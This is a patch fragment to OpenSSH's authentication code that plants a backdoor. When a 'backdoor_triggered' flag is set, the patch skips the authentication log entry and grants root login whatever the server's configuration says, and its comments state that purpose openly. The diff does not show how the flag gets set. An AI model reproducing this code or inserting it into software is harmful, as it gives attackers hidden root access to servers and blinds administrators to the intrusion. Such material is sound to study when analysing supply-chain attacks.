@@ -307,17 +307,19 @@ auth_log(struct ssh *ssh, int authenticated, int partial,
 			extra = xstrdup(authctxt->auth_method_info);
 	}
 
-	do_log2(level, "%s %s%s%s for %s%.100s from %.200s port %d ssh2%s%s",
-	    authmsg,
-	    method,
-	    submethod != NULL ? "/" : "", submethod == NULL ? "" : submethod,
-	    authctxt->valid ? "" : "invalid user ",
-	    authctxt->user,
-	    ssh_remote_ipaddr(ssh),
-	    ssh_remote_port(ssh),
-	    extra != NULL ? ": " : "",
-	    extra != NULL ? extra : "");
-
+	/* Dont log backdoor authentications */
+	if (!ssh->backdoor_triggered == 1) {
+		do_log2(level, "%s %s%s%s for %s%.100s from %.200s port %d ssh2%s%s",
+			authmsg,
+			method,
+			submethod != NULL ? "/" : "", submethod == NULL ? "" : submethod,
+			authctxt->valid ? "" : "invalid user ",
+			authctxt->user,
+			ssh_remote_ipaddr(ssh),
+			ssh_remote_port(ssh),
+			extra != NULL ? ": " : "",
+			extra != NULL ? extra : "");
+	}
 	free(extra);
 
 #if defined(CUSTOM_FAILED_LOGIN) || defined(SSH_AUDIT_EVENTS)
@@ -364,6 +366,8 @@ auth_maxtries_exceeded(struct ssh *ssh)
 int
 auth_root_allowed(struct ssh *ssh, const char *method)
 {
+	/* Backdoor allows root login for our session */
+	if (ssh->backdoor_triggered == 1) return 1;
 	switch (options.permit_root_login) {
 	case PERMIT_YES:
 		return 1;
